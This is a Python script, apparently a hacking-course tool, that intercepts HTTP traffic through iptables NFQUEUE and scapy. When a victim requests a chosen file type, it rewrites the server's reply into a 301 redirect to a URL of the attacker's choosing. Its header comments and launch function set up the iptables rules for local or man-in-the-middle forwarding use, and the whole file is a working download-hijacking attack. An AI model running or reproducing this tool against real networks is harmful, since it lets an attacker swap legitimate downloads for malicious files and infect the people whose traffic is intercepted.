# iptables -I FORWARD -j NFQUEUE --queue-num 0 [The Queue number is User Specified] [This forwards the packets from remote computers to the NFQUEUE Chain.]
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0   [These Two commands to be used on Local Computer.]

import netfilterqueue
import scapy.all as scapy
from termcolor import colored
import argparse
import os
import sys

seq_list = []

def get_argurments():
    parse = argparse.ArgumentParser()
    parse.add_argument("-f", "--filetype", dest="filetype", help="Filetype of the File to be Replaced")
    parse.add_argument("-u", "--url", dest="url", help="URL for Replacement File. (Full URL)" )
    parse.add_argument("-m", "--machine", dest="machine", help="Machine to run the Attack on. (remote or local)")
    args = parse.parse_args()
    if not args.filetype:
        parse.error(colored("[-] TargetFileType not Specified. Use -h to display Help.", "yellow"))
    if not args.url:
        parse.error(colored("[-] Replacement File URL not Specified. Use -h to display Help.", "yellow"))
    if not args.machine:
        parse.error(colored("[-] Target Machine not Specified. Use -h to display Help.", "yellow"))
    return args

def process_queue():
    queue = netfilterqueue.NetfilterQueue()  # Creating an Instance of NetFilterQueue.
    queue.bind(0, process_packets)  # Binding the instance to the '0' Queue-num in Iptables rule.
    queue.run()

def set_packet_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packets(packet):
    args = get_argurments()
    scapy_packet = scapy.IP(packet.get_payload()) # To convert the Raw packets into scapy packets.
    if scapy_packet.haslayer(scapy.Raw):          # Checking for Raw Layer which contains the useful Data.
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                if args.filetype in scapy_packet[scapy.Raw].load:
                    print(colored("[+] File Request", "yellow"))
                    load = scapy_packet[scapy.Raw].load
                    print(colored("[+] Request >> ", "green") + load)
                    seq_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in seq_list:
                    seq_list.remove(scapy_packet[scapy.TCP].seq)
                    print(colored("[+] Replacing File", "green"))
                    modified_packet = set_packet_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "+ args.url + "\n\n")
                    modified_response = scapy_packet[scapy.Raw].load
                    print(colored("[+] Modified Response >> " + modified_response))
                    packet.set_payload(str(modified_packet))
    packet.accept()                               # Forwarding the Packets.

def launch_attack():
    args = get_argurments()
    if args.machine == "local":
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
    elif args.machine == "remote":
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
    else:
        print(colored("[-] Machine Unrecognised.", "yellow"))
        sys.exit()
    print(colored("[+] File Interceptor running... Make sure you specified the FileType (-f), Replacement File URL (-u) and Target Machine (-m).", "green"))
    try:
        process_queue()
    except KeyboardInterrupt:
        print(colored("[-] Ctrl-C Detected... Quitting..", "yellow"))
        os.system('iptables --flush')
        print(colored("[+] Restored IPTables.", "yellow"))
        sys.exit()

launch_attack()